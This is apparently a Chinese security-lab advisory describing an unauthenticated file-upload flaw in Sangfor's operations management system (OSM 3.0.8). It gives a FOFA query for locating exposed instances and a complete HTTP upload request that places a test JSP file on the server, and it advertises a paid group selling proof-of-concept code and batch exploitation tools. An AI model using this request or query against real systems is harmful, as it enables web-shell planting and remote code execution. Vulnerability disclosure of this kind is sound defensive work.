#  【漏洞预警】Sangfor 运维管理系统 文件上传漏洞  
by 融云安全-sm  融云攻防实验室   2026-01-13 04:20  
  
**0x01 阅读须知**  
  
**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！**  
  
**0x02 漏洞描述**  
  
Sangfor 运维管理系统 (OSM) 版本 3.0.8 存在一个严重的任意文件上传漏洞。该漏洞位于 /fort/trust/version/common/common.jsp 端点。该端点的请求未能强制执行身份验证或正确的文件类型验证。远程的、未认证的攻击者可以通过发送精心构造的HTTP POST请求上传恶意文件（例如.jsp web shell）。 一旦上传，文件将存储在网页根目录下（通常在/fort/trust/version/common/下），可以通过网页浏览器直接执行，从而导致以网页服务器的权限（通常是root或tomcat）执行远程命令执行（RCE）。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49xuW6yGZdGxsTkcxVzUkcbtBnkBd7MPOIlaD3Vu0xAjEb5QoEibfFUyzibPkUZzZN8l68xzRCEbKzGg/640?wx_fmt=png&from=appmsg "")  
  
**0x03 漏洞复现**  
  
f  
ofa：body="/fort/login" && product="SANGFOR-运维安全管理系统"  
  
1.上传无害文件访问得到结果  
  
```
POST /fort/trust/version/common/common.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Content-Length: 96
------geckoformboundaryf079b5206c15039ed1e6fe97927beff5: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/png
Priority: u=0, i
Upgrade-Insecure-Requests: 1

<%
out.println("Hello World");
%>

/fort/trust/version/common/1.jsp
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49xuW6yGZdGxsTkcxVzUkcbt9gnIyKEHxoYPnh2rLUeWZmw579kG60fpw6sxdrOtYibLtibXJLoLVZeA/640?wx_fmt=png&from=appmsg "")  
  
  
2.nuclei图形化检测工具和poc已公布在星球  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49xuW6yGZdGxsTkcxVzUkcbtf59Z29K0ibrIHHon3YMqTEATGl0ZkGRWcuUGfW5asnIiaWryIq1nVntw/640?wx_fmt=png&from=appmsg "")  
  
**最后给兄弟们推荐下圈子，高质量漏洞利用研究，代码审计圈子，每周至少更新三个0Day/Nday及对应漏洞的批量利用工具，团队内部POC，源码分享，星球不定时更新内外网攻防渗透技巧以及最新学习，SRC研究报告等。**  
  
**【圈子权益】**  
  
**1，一年至少200+漏洞Poc及对应漏洞批量利用工具**  
  
**2，各种漏洞利用工具及后续更新，渗透工具、文档资源分享**  
  
**3，内部漏洞库情报分享（目前已有1000+poc，会每日更新，包括部分未公开0/1day）**  
  
**圈子目前价格为59元，现在星球有1000+位师傅相信并选择加入我们**  
  
****  
****  
**0x05 公司简介**  
  
江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
  
   公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......  
****  
  
广告：  
CNNVD二级和三级申请、续期私聊找我对话，价格便宜童叟无欺！  
  
**编制：sm**  
  
**审核：fjh**  
  
**审核：Dog**  
  
****  
**1个1朵********5毛钱**  
  
**天天搬砖的小M**  
  
**能不能吃顿好的**  
  
**就看你们的啦**  
  
****  
  
